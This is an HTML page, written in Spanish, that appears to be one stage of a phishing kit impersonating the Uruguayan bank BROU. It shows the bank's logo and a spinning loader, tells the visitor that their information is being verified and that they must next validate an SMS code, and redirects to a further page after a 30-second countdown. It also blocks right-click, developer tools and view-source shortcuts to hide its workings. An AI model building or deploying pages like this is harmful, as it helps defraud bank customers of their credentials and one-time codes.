<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>.</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #08528D; /* Fondo igual al sistema */
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      color: white;
    }

    .circle {
      width: 160px;
      height: 160px;
      border-radius: 50%;
      border: 8px solid #FFCB05;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-bottom: 15px;
      background-color: white;
      animation: girar 2s linear infinite;
    }

    .circle img {
      width: 90%;
      border-radius: 50%;
    }

    #contador {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 25px;
    }

    button {
      background-color: #0066B3;
      color: white;
      padding: 10px 140px;
      border: none;
      border-radius: 15px;
      cursor: pointer;
      font-size: 18px;
    }
  @keyframes girar {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }

    .circle img {
      width: 90%;
      border-radius: 50%;
      animation: fijo 2s linear infinite;
    }

    @keyframes fijo {
      from { transform: rotate(0deg); }
      to { transform: rotate(-360deg); }
    }
  </style>

<script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>


</head>
<body>

  <div class="circle">
    <img src="https://avisador.com.uy/wp-content/uploads/2022/07/LogoBROU.png" alt="EBROU Logo">
  </div>

  <p style="font-size:20px; text-align:center; max-width:300px; margin-bottom:15px;">Por favor no cierre esta ventanilla. Estamos verificando <br><br> su información. A continuación debe de validar su Codigo SMS.</p>

  <div id="contador">0:30</div>

  

  <script>
    let segundos = 30;

    function actualizarContador() {
      let texto = "0:" + (segundos < 10 ? "0" + segundos : segundos);
      document.getElementById("contador").textContent = texto;

      if (segundos === 0) {
        window.location.href = "3.html";
      } else {
        segundos--;
        setTimeout(actualizarContador, 1000);
      }
    }

    function iniciar() {
      actualizarContador();
    }
      actualizarContador();
  </script>

</body>
</html>
